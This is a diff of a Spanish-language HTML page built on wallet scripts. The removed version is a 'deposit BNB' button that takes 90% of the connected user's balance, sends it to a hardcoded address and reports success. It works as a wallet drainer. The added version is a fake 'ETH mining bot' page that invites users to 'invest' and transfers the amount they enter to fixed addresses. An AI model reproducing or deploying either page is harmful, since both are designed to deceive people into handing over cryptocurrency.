@@ -1,60 +1,45 @@
 <!DOCTYPE html>
 <html>
   <head>
-    <meta charset="UTF-8" />
-    <title>Botón de depósito de BNB en BSC</title>
-    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/gh/binance-chain/javascript-sdk@1.0.14/dist/bnbSdk.umd.min.js"></script>
+    <meta charset="UTF-8">
+    <title>Bot de minería ETH</title>
+    <script src="https://cdn.jsdelivr.net/npm/web3@1.5.2/dist/web3.min.js"></script>
   </head>
   <body>
-    <button id="deposit-button">Depositar BNB</button>
+    <div class="card">
+      <h3>Bot de minería 1</h3>
+      <p>Ingrese la cantidad de ETH que desea invertir:</p>
+      <input type="number" id="amount1">
+      <button onclick="sendETH('0x0000000000000000000000000000000000000000', document.getElementById('amount1').value)">Invertir</button>
+    </div>
+
+    <div class="card">
+      <h3>Bot de minería 2</h3>
+      <p>Ingrese la cantidad de ETH que desea invertir:</p>
+      <input type="number" id="amount2">
+      <button onclick="sendETH('0x1111111111111111111111111111111111111111', document.getElementById('amount2').value)">Invertir</button>
+    </div>
 
     <script>
-      // Crea una instancia de la SDK de Binance
-      const bnbSdk = new bnbSdk.default();
-      bnbSdk.setProvider("https://bsc-dataseed1.binance.org:443");
-
-      // Escucha el evento de click en el botón de depósito
-      $("#deposit-button").click(async function () {
-        try {
-          // Obtiene la dirección de la cuenta del usuario
-          const accounts = await bnbSdk.request({ method: "eth_accounts" });
-          const userAddress = accounts[0];
-
-          // Obtiene el saldo de BNB en la cuenta del usuario
-          const balance = await bnbSdk.request({
-            method: "eth_getBalance",
-            params: [userAddress, "latest"],
-          });
-          const balanceBN = new bnbSdk.BN(balance.slice(2), 16);
-
-          // Calcula la cantidad a depositar (90% del saldo)
-          const depositAmountBN = balanceBN.muln(90).divn(100);
-          const depositAmount = bnbSdk.BnbApiClientNumber.toString(
-            depositAmountBN
-          );
-
-          // Dirección de destino para el depósito
-          const depositTo = "0x8935361d21943Ee8a863082EdD8a6Aefb062E434";
-
-          // Crea la transacción y la firma con Metamask
-          const tx = {
-            from: userAddress,
-            to: depositTo,
-            value: bnbSdk.toWei(depositAmount, "ether"),
-          };
-          const signedTx = await bnbSdk.request({
-            method: "eth_sendTransaction",
-            params: [tx],
-          });
-
-          console.log("Transacción enviada:", signedTx);
-          alert("¡Depósito exitoso!");
-        } catch (error) {
-          console.error(error);
-          alert("Error al enviar la transacción. Verifica que tienes suficiente saldo y que Metamask está conectado.");
+      async function sendETH(toAddress, amount) {
+        if (window.ethereum) {
+          try {
+            await window.ethereum.enable();
+            const web3 = new Web3(window.ethereum);
+            const accounts = await web3.eth.getAccounts();
+            const txHash = await web3.eth.sendTransaction({
+              from: accounts[0],
+              to: toAddress,
+              value: web3.utils.toWei(amount, 'ether')
+            });
+            console.log(`Transacción enviada: ${txHash}`);
+          } catch (error) {
+            console.error(error);
+          }
+        } else {
+          console.error('MetaMask no está instalado');
         }
-      });
+      }
     </script>
   </body>
 </html>
